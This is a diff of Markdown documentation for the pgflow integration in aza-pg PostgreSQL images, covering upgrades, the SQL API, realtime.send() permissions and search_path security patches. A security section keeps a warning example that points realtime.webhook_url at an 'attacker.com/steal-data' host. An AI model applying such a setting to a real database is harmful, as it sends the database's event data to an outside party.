@@ -1,4 +1,4 @@
-# pgflow v0.14.1 - Supabase Compatibility Layer
+# pgflow - Supabase Compatibility Layer
 
 This document describes how pgflow (Supabase's workflow orchestration extension) is integrated into aza-pg custom PostgreSQL builds.
 
@@ -23,12 +23,11 @@ This document describes how pgflow (Supabase's workflow orchestration extension)
 
 2. **Security Patches** (`docker/postgres/pgflow/security-patches.sql`)
    - Fixes search_path hijacking vulnerabilities (AZA-PGFLOW-001, AZA-PGFLOW-002)
-   - Adapts is_local() for non-Supabase environments (COMPAT-AZA-PG-001)
-   - Applied at runtime after pgflow schema loads
+   - Applied right after the pgflow schema: by `05-pgflow-init.sh` at initdb, and by `pgflow-upgrade`
 
-3. **Custom Installation Marker** (`00-aza-pg-settings.sh`)
-   - Sets `app.aza_pg_custom = 'true'` system-wide
-   - Used by is_local() to detect custom installations
+`pgflow.is_local()` is upstream's: it returns true only when `app.settings.jwt_secret` equals the Supabase CLI's
+built-in local secret, so on aza-pg it is false. That is the production-safe mode: when a worker deploys a flow whose
+definition changed, the worker refuses to start instead of deleting the flow and all its runs.
 
 ## Installation
 
@@ -37,11 +36,11 @@ This document describes how pgflow (Supabase's workflow orchestration extension)
 pgflow is automatically installed during container initialization:
 
 ```bash
-docker run -e POSTGRES_PASSWORD=secret ghcr.io/fluxo-kt/aza-pg:pg18
+docker run -e POSTGRES_PASSWORD=secret ghcr.io/fluxo-kt/aza-pg:18
 # pgflow schema + patches loaded automatically
 ```
 
-**Note**: `:pg18` is a convenience tag pointing to the latest PostgreSQL 18 build. For production, use specific timestamped tags (e.g., `18.1-202501142330-single-node`) for reproducible builds.
+**Note**: `:18` is a convenience tag pointing to the latest PostgreSQL 18 build. For production, use specific timestamped tags (e.g., `18.4-202606031012-single-node`) for reproducible builds.
 
 ### New Databases
 
@@ -60,8 +59,22 @@ CREATE DATABASE my_app TEMPLATE template1;
 Test that it works:
 
 ```sql
-SELECT pgflow.is_local();  -- Should return: t (true)
+SELECT obj_description('pgflow'::regnamespace);  -- pgflow <version>
 ```
+
+### Upgrading Existing Databases
+
+pgflow is installed only when a database is created, so a database keeps its pgflow version when you move to a newer image. Upgrade it yourself, after stopping your pgflow workers and before deploying `@pgflow/client` / `@pgflow/dsl` of the new version:
+
+```bash
+docker exec <container> pgflow-upgrade            # every database with a pgflow schema
+docker exec <container> pgflow-upgrade my_app     # or only the ones you name
+```
+
+- The current version is read from the schema comment (`pgflow X.Y.Z`), or recognised from the schema's structure for databases created by older images; `--from X.Y.Z` is needed only when the command says it cannot tell.
+- Each database is upgraded in one transaction with upstream's migrations plus aza-pg's patches, ending identical to a fresh install; on any error it rolls back and reports it. A second run prints "up to date".
+- Databases created by images that shipped pgflow 0.13.x are refused unchanged: those images installed an incomplete schema that no upstream migration path fits.
+- pgflow telemetry stays off: the upgrade never schedules upstream's daily usage report. To opt in, run `SELECT pgflow_telemetry.enable();` (and `SELECT pgflow_telemetry.disable();` to stop).
 
 ## Usage
 
@@ -71,7 +84,7 @@ In the default database (created via `POSTGRES_DB` environment variable), pgflow
 
 ```sql
 -- Verify pgflow is installed
-SELECT pgflow.is_local();  -- Returns: t (true)
+SELECT obj_description('pgflow'::regnamespace);  -- pgflow <version>
 
 -- List available pgflow tables
 \dt pgflow.*
@@ -93,71 +106,30 @@ CREATE DATABASE my_app;
 -- 2. Connect to new database
 \c my_app
 
--- 3. Install required extensions (pgflow prerequisites)
-CREATE EXTENSION IF NOT EXISTS pgmq;          -- Optional: Message queue for realtime.send() degradation
-CREATE EXTENSION IF NOT EXISTS pg_net;        -- Optional: HTTP webhooks via realtime.send()
-CREATE EXTENSION IF NOT EXISTS supabase_vault;  -- Optional: Credential storage (pgflow works without it)
-
--- 4. Install pgflow schema
+-- 3. Install pgflow schema (schema.sql creates pgmq and pg_net itself, and supabase_vault/pg_cron where they can load)
 \i /opt/pgflow/schema.sql
 \i /opt/pgflow/security-patches.sql
 
--- 5. Verify installation
-SELECT pgflow.is_local();  -- Returns: t (true)
+-- 4. Verify installation
+SELECT obj_description('pgflow'::regnamespace);  -- pgflow <version>
 
--- 6. pgflow is now ready - use the DSL or SQL API
+-- 5. pgflow is now ready - use the DSL or SQL API
 ```
 
 ### Creating and Running Workflows
 
 pgflow uses a **TypeScript DSL** for workflow definition. Direct SQL manipulation of pgflow tables is not recommended.
 
-**Recommended approach** - Use the official TypeScript packages:
-
-```bash
-bun add @pgflow/dsl @pgflow/client
-```
-
-**TypeScript Example**:
-
-```typescript
-import { Flow } from "@pgflow/dsl";
-import { createClient } from "@pgflow/client";
-
-// Define flow with typed input
-interface WelcomeInput {
-  userId: number;
-}
-
-const welcomeFlow = new Flow<WelcomeInput>({ slug: "welcome-user" }).step(
-  { slug: "send-email" },
-  async (input) => {
-    // Call external API to send welcome email
-    const response = await fetch("https://api.example.com/send-welcome", {
-      method: "POST",
-      headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ userId: input.userId }),
-    });
-    return await response.json();
-  }
-);
-
-// Initialize pgflow client
-const pgflowClient = createClient({
-  connectionString: "postgresql://postgres:secret@localhost:5432/postgres",
-});
-
-// Start flow and wait for completion
-const run = await pgflowClient.startFlow("welcome-user", { userId: 123 });
-const result = await pgflowClient.waitForStatus(run.run_id, "completed");
-console.log("Flow completed:", result);
-```
+Flows are defined with `@pgflow/dsl` and their step handlers run in a pgflow worker; see the official docs below. `@pgflow/client` takes a supabase-js client and gets live progress from Supabase Realtime broadcasts, which this image replaces with the `realtime.send()` stub, so on aza-pg follow runs through [Event Broadcasting](#event-broadcasting) or by querying `pgflow.runs`.
 
 **SQL API** (advanced usage):
 
 ```sql
 -- Create flow
 SELECT pgflow.create_flow('my-flow', 3, 5, 60);
+
+-- Start a run
+SELECT * FROM pgflow.start_flow('my-flow', '{"userId": 123}'::jsonb);
 
 -- View flows
 SELECT * FROM pgflow.flows;
@@ -241,7 +213,7 @@ Content-Type: application/json
 -- PUBLIC execution is revoked by default
 REVOKE EXECUTE ON FUNCTION realtime.send(jsonb, text, text, boolean) FROM PUBLIC;
 
--- Only postgres superuser has access
+-- Superusers bypass the check
 -- Application roles must be explicitly granted
 GRANT EXECUTE ON FUNCTION realtime.send(jsonb, text, text, boolean) TO my_app_role;
 ```
@@ -267,11 +239,10 @@ SET realtime.webhook_url = 'https://attacker.com/steal-data';  -- DON'T DO THIS
 
 ### Security Patches Applied
 
-| Identifier            | Component                | Issue                   | Fix                                   |
-| --------------------- | ------------------------ | ----------------------- | ------------------------------------- |
-| **AZA-PGFLOW-001**    | get_run_with_states()    | search_path hijacking   | Added `SET search_path = ''`          |
-| **AZA-PGFLOW-002**    | start_flow_with_states() | search_path hijacking   | Added `SET search_path = ''`          |
-| **COMPAT-AZA-PG-001** | is_local()               | Supabase-only detection | Check for `app.aza_pg_custom` setting |
+| Identifier         | Component                | Issue                 | Fix                          |
+| ------------------ | ------------------------ | --------------------- | ---------------------------- |
+| **AZA-PGFLOW-001** | get_run_with_states()    | search_path hijacking | Added `SET search_path = ''` |
+| **AZA-PGFLOW-002** | start_flow_with_states() | search_path hijacking | Added `SET search_path = ''` |
 
 ## Upstream Tracking
 
@@ -291,8 +262,8 @@ WHERE n.nspname = 'realtime' AND proname = 'send';
 -- Check pgflow schema
 SELECT COUNT(*) FROM pgflow.flows;
 
--- Test is_local() detection
-SELECT pgflow.is_local();  -- Should return: t
+-- Installed pgflow version
+SELECT obj_description('pgflow'::regnamespace);  -- pgflow <version>
 ```
 
 ### Test Event Broadcasting
@@ -315,14 +286,8 @@ SELECT realtime.send(
 
 ### Automated Tests
 
-Run comprehensive test suite:
-
 ```bash
-# Test pgflow installation and security patches
-bun run scripts/test/test-pgflow-security.ts
-
-# Test new database functionality
-bun run scripts/test/test-pgflow-new-database.ts
+bun scripts/test/test-pgflow.ts   # pgflow in the built image (aza-pg:pg18 by default)
 ```
 
 ## Troubleshooting
@@ -350,31 +315,7 @@ If missing, the realtime stub was not installed during initialization. This scri
 docker exec <container-name> bash /docker-entrypoint-initdb.d/04a-pgflow-realtime-stub.sh
 ```
 
-Note: This script modifies template1 and requires PostgreSQL superuser privileges. It's normally executed automatically during container initialization.
-
-### Issue: is_local() returns false
-
-**Symptoms**:
-
-```sql
-SELECT pgflow.is_local();
--- Returns: f (false)
-```
-
-**Solution**: Verify custom installation marker:
-
-```sql
-SELECT current_setting('app.aza_pg_custom');
--- Should return: true
-```
-
-If not set, the aza-pg custom settings were not applied during initialization. This script runs automatically during container startup and requires superuser privileges. To reinstall:
-
-```bash
-docker exec <container-name> bash /docker-entrypoint-initdb.d/00-aza-pg-settings.sh
-```
-
-Note: This script sets custom PostgreSQL parameters and requires superuser privileges. It's normally executed automatically during container initialization.
+Note: the script installs into template1 and `POSTGRES_DB`, and needs superuser privileges.
 
 ### Issue: Permission denied on realtime.send()
 
@@ -401,35 +342,13 @@ GRANT EXECUTE ON FUNCTION realtime.send(jsonb, text, text, boolean) TO my_app_ro
 
 ## Version Compatibility
 
-| aza-pg Version  | pgflow Version | PostgreSQL | Notes                  |
-| --------------- | -------------- | ---------- | ---------------------- |
-| 18.1-202501xx\* | 0.13.1         | 18.1       | Initial integration    |
-| Unreleased      | 0.14.1         | 18.3       | Conditional step logic |
+The pgflow version an image ships is listed in `CHANGELOG.md` per release and in `/etc/postgresql/version-info.txt` inside the image; it comes from the `pgflow` tag in `scripts/extensions/manifest-data.ts`. Use `@pgflow/client` and `@pgflow/dsl` of the same version.
 
-\* _Version format note: `xx` represents a timestamp suffix automatically generated during build (e.g., `202501121430` for Jan 12, 2:30 PM). Use the full version tag from your image._
+## Choosing an Event Layer
 
-## Performance Considerations
-
-### pg_notify
-
-- **Latency**: <1ms (immediate)
-- **Throughput**: 1000s/sec
-- **Persistence**: None (in-memory only)
-- **Best For**: Real-time UI updates, single-server deployments
-
-### pgmq
-
-- **Latency**: ~10ms (queue write)
-- **Throughput**: 100s-1000s/sec
-- **Persistence**: Durable (table-backed)
-- **Best For**: Reliable event processing, work queues
-
-### pg_net Webhooks
-
-- **Latency**: ~50-500ms (HTTP round-trip)
-- **Throughput**: 10s-100s/sec
-- **Persistence**: Best-effort (no retry on failure)
-- **Best For**: External system integration, audit trails
+- **pg_notify**: immediate, not persisted; listeners must be connected. Real-time UI updates.
+- **pgmq**: durable, table-backed queue. Reliable event processing.
+- **pg_net webhooks**: asynchronous HTTP POST after commit, no retry on failure. External system integration.
 
 ## References
 
@@ -446,6 +365,6 @@ Found a bug or have a suggestion? Please file an issue at: [aza-pg/issues](https
 When reporting pgflow issues, include:
 
 - aza-pg image version
-- pgflow version (check `/opt/pgflow/schema.sql` header or `/opt/pgflow/security-patches.sql`)
+- pgflow version (`SELECT obj_description('pgflow'::regnamespace);`)
 - Error message and stack trace
 - Steps to reproduce
